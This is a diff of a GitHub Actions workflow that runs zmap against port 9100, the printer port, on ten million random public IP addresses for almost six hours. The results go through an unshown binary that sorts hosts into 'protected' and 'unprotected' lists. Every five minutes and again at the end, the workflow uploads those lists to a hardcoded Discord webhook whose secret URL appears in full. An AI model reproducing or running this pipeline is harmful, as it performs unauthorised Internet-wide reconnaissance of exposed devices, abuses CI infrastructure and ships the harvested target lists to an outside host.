@@ -45,50 +45,77 @@ jobs:
       - name: 🚀 Start zmap scanner in background
         run: |
           echo "🚀 Starting zmap → d pipeline..."
-          nohup bash -c 'zmap -p 9100 -q -B 800M | ./d' > scanner.log 2>&1 &
+          
+          # generate 10M random IPs so zmap has targets to scan
+          echo "🔄 Generating 10M random IPs..."
+          python3 -c "
+import random, ipaddress
+excluded = [ipaddress.ip_network(x) for x in [
+    '0.0.0.0/8','10.0.0.0/8','127.0.0.0/8','172.16.0.0/12',
+    '192.168.0.0/16','169.254.0.0/16','224.0.0.0/4','240.0.0.0/4',
+    '100.64.0.0/10','192.0.0.0/24','198.18.0.0/15'
+]]
+def gen():
+    while True:
+        ip = f'{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}'
+        a = ipaddress.ip_address(ip)
+        if not any(a in n for n in excluded): return ip
+with open('targets.txt', 'w') as f:
+    for _ in range(10000000): f.write(gen() + '\n')
+"
+          
+          nohup bash -c 'zmap -p 9100 -q -B 800M -w targets.txt | ./d' > scanner.log 2>&1 &
           echo $! > scanner.pid
           echo "✅ Scanner started (PID: $(cat scanner.pid))"
 
-      - name: ⏳ Live Monitor & Run for 5h55m
+      - name: ⏳ Live Logs & Run for 5h55m
         run: |
-          echo "⏳ Running for 5 hours 55 minutes with live updates..."
+          echo "⏳ Running for 5 hours 55 minutes..."
           END_TIME=$((SECONDS + 21300))
           WEBHOOK="https://discord.com/api/webhooks/1552599497895452712/EySoc-KqZAfDZ8_Y33aIBDXdPH07H9fW-ko13fAjHeG8mkLwDqE87SKvw1OKsrBbrEPG"
-          LAST_PING=0
+          LAST_FILE_PING=0
+          
+          # truncate scanner.log to start fresh
+          > scanner.log
           
           while [ $SECONDS -lt $END_TIME ]; do
             # check if scanner is alive
             if ! kill -0 $(cat scanner.pid) 2>/dev/null; then
               echo "⚠️ Scanner died, restarting..."
-              nohup bash -c 'zmap -p 9100 -q -B 800M | ./d' > scanner.log 2>&1 &
+              > scanner.log
+              nohup bash -c 'zmap -p 9100 -q -B 800M -w targets.txt | ./d' > scanner.log 2>&1 &
               echo $! > scanner.pid
             fi
             
-            # get live stats
-            BIG=$(wc -l < big.txt 2>/dev/null || echo 0)
-            PROT=$(wc -l < protected.txt 2>/dev/null || echo 0)
-            UNPROT=$(wc -l < unprotected.txt 2>/dev/null || echo 0)
+            # print new scanner logs every 2 seconds
+            tail -n 1 scanner.log 2>/dev/null
             UPTIME_MIN=$((SECONDS / 60))
             
-            # print to actions log every 5 seconds
-            echo "📊 [${UPTIME_MIN}m] big: $BIG | protected: $PROT | unprotected: $UNPROT | PID: $(cat scanner.pid)"
-            
-            # send discord update every 30 minutes (1800s)
             NOW=$SECONDS
-            if [ $((NOW - LAST_PING)) -ge 1800 ]; then
-              LAST_PING=$NOW
-              curl -s -H "Content-Type: application/json" \
-                   -X POST \
-                   -d "{\"content\":\"📊 **Scanner Status [${UPTIME_MIN}m]**\n> big.txt: **$BIG lines**\n> protected.txt: **$PROT lines**\n> unprotected.txt: **$UNPROT lines**\"}" \
+            # send files to discord every 5 minutes (300s)
+            if [ $((NOW - LAST_FILE_PING)) -ge 300 ]; then
+              LAST_FILE_PING=$NOW
+              echo "📤 Sending 5-minute file update to Discord..."
+              
+              # count lines
+              BIG=$(wc -l < big.txt 2>/dev/null || echo 0)
+              PROT=$(wc -l < protected.txt 2>/dev/null || echo 0)
+              UNPROT=$(wc -l < unprotected.txt 2>/dev/null || echo 0)
+              
+              # upload all 3 text files to discord
+              curl -s -F "file1=@big.txt" \
+                   -F "file2=@protected.txt" \
+                   -F "file3=@unprotected.txt" \
+                   -F "payload_json={\"content\":\"📊 **5-Min Update [${UPTIME_MIN}m]**\n> big.txt: $BIG lines\n> protected.txt: $PROT lines\n> unprotected.txt: $UNPROT lines\"}" \
                    "$WEBHOOK"
             fi
             
-            sleep 5
+            sleep 2
           done
           
-          echo "⏰ Time's up — sending results to Discord..."
+          echo "⏰ Time's up — sending final results to Discord..."
 
-      - name: 📤 Send results to Discord
+      - name: 📤 Send final results to Discord
         run: |
           WEBHOOK="https://discord.com/api/webhooks/1552599497895452712/EySoc-KqZAfDZ8_Y33aIBDXdPH07H9fW-ko13fAjHeG8mkLwDqE87SKvw1OKsrBbrEPG"
           
@@ -107,18 +134,18 @@ jobs:
             fi
           }
           
-          send_file "big.txt" "📦 **big.txt** results:"
+          send_file "big.txt" "📦 **big.txt** FINAL results:"
           sleep 2
-          send_file "protected.txt" "🔒 **protected.txt** results:"
+          send_file "protected.txt" "🔒 **protected.txt** FINAL results:"
           sleep 2
-          send_file "unprotected.txt" "🔓 **unprotected.txt** results:"
+          send_file "unprotected.txt" "🔓 **unprotected.txt** FINAL results:"
 
       - name: 🛑 Kill scanner
         run: |
           kill $(cat scanner.pid) 2>/dev/null || true
           echo "✅ Scanner stopped"
 
-      - name: 💾 Save backup (git, no transfer.sh)
+      - name: 💾 Save backup (git)
         run: |
           name="${{ github.event.client_payload.vps_name }}"
           zip -r ".backup/$name.zip" big.txt protected.txt unprotected.txt d.go d scanner.log 2>/dev/null || true
